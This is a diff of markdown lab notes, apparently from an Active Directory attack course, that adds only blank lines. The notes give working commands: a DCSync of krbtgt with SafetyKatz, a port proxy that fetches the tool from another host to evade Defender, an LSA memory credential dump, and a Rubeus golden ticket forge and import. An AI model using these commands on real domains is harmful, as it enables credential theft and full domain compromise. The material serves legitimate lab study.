@@ -9,18 +9,32 @@ There are two ways of extracting creadentials from DC
 2]lsass credential extraction
 
 First we move on with DC Sync,, for doing dcsync we need priv of da,ea,domaincontrollers here we have DA priv
+
+
 so in the svc admin shell run dcsync:```C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"```
+
+
 O/P:
 ![alt text](image-44.png)
 we get both ntlm and aes of krbtgt account,,we can use it to do ticket attacks
 
 Second extracting the credentials from the memory of the DC:
+
+
 for that we need to download and run safetykatz in memory of DC so copy loader to dc: ```echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y```
+
+
 connect to dc as svc admin:```winrs -r:dcorp-dc cmd```
+
+
 set portforwarding in dc to download safetykatz form remote location without detected by windows defender
 command:```>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.219```
+
+
 Start to extract creds from memory of DC
 command:```C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"```
+
+
 O\P:only contains the ntlm hashes if we want aes then do dc sync
 mimikatz(commandline) # lsadump::evasive-lsa /patch
 Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648
@@ -150,7 +164,11 @@ NTLM : c70bd4a427e9decd8c9135299c63226e
 ii) and iii)creating golden ticket attack and gettig domain admin priv
 using the aes key of krbtgt account obtained by dcsync atttack we can forge a golden ticket
 run the below command in student vm shell without invishell
+
+
 command:```C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd```
+
+
 O/P:
 C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /logoncount:1087 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
 
@@ -158,8 +176,12 @@ in the above output generated add -path C:\AD\Tools\Rubeus.exe -args in the begi
 after adding the command should look like this:
 ```C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /logoncount:1087 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt```
 run the command so that the forged ticket will be imported.
+
+
 After that login to dc as Administrator using the forged golden ticket
 ```winrs -r:dcorp-dc cmd```
+
+
 then check username and computername
 ![alt text](image-45.png)
 
